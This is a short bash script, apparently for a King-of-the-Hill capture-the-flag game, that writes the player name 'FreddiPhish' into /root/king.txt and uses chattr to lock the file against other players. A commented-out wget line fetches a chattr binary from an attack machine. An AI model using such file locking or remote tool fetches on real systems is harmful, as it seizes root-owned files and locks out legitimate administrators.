#!/bin/bash

#get chattr from attack machine
#wget -qO /tmp/chattr http://10.0.0.1:80/chattr

#make /root/king.txt non-immutable
chattr -ia /root/king.txt

set +o noclobber

#write username to /root/king.txt
echo 'FreddiPhish' > /root/king.txt

#Prevent overwrite with noclobber
#set -o noclobber

#add noclobber rule to .bashrc
#echo 'set -o noclobber' > ~/.bashrc

#make /root/king.txt immutable, added the +a in case somone only removes the -i
chattr +ia /root/king.txt

